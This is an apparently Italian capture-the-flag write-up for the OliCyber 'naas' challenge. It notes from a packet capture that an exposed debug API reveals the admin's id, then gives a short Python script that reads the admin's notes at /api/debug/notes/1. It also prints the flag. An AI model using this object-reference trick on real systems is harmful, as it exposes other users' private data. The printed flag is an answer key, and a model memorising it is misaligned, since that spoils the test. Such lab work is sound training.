#nel pcap notiamo delle get a /api/debug/users, da li scopriamo che admin ha id 1, notiamo poi anche delle get a /api/debug/notes/2, ci fa capire che per accedere alle note dell'admin basta fare:
import requests

site = "http://naas.challs.olicyber.it"
r = requests.get(f"{site}/api/debug/notes/1").text
print(r)

#flag{nev3r_sh1p_d3bug_build5!}